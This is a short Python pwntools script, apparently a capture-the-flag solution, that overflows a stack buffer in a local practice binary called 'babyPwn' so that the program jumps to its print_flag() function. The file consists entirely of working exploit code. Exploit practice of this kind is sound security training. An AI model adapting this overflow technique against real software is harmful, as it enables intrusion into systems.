from pwn import *

# local binary
binary = "./babyPwn"
elf = ELF(binary)

# address of print_flag() from gdb
print_flag_addr = elf.symbols['print_flag']

# stack offset (adjust if needed)
offset = 72

# build payload
payload = b"A" * offset + p64(print_flag_addr)

def exploit():
    # run local process
    p = process(binary)

    # receive initial prompt
    print(p.recvuntil(b"numbers ?"))

    # tell program how many numbers to send
    p.sendline(b"1")  # send 1 element to overflow

    # receive first element prompt
    print(p.recvuntil(b"Element [0]"))

    # send payload as first element
    p.sendline(payload)

    # receive and print output
    print(p.recvall(timeout=2).decode(errors='ignore'))

    p.close()

if __name__ == "__main__":
    exploit()
